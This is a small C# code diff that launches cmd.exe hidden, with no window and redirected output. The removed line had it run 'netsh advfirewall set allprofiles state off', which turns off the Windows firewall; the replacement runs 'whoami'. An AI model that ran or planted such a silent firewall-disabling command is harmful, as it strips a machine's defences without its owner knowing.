@@ -6,7 +6,7 @@
         // إنشاء كائن عملية لتنفيذ الأمر
         Process process = new Process();
         process.StartInfo.FileName = "cmd.exe";
-        process.StartInfo.Arguments = "/c netsh advfirewall set allprofiles state off";
+        process.StartInfo.Arguments = "/c whoami";
         process.StartInfo.UseShellExecute = false;
         process.StartInfo.RedirectStandardOutput = true;
         process.StartInfo.CreateNoWindow = true;
